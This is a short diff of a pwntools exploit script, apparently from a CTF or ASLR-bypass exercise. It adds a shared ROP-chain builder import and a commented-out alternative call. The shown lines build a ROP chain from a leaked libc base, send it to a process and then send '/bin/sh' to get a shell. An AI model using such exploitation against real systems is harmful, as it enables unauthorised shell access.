@@ -1,4 +1,5 @@
 from pwn import *
+from aslr_common import mkrop as mkrop_common
 
 def mkrop(pad, libc_base):
     rebase_0 = lambda x: p64(x + libc_base)
@@ -94,6 +95,7 @@ p.close()
 
 p = get_process()
 rop = mkrop(pad, libc_base)
+# rop = mkrop_common(pad, libc_base) # uncomment this line to use the common mkrop function
 p.sendline(rop)
 p.sendline(b'/bin/sh')
 try:
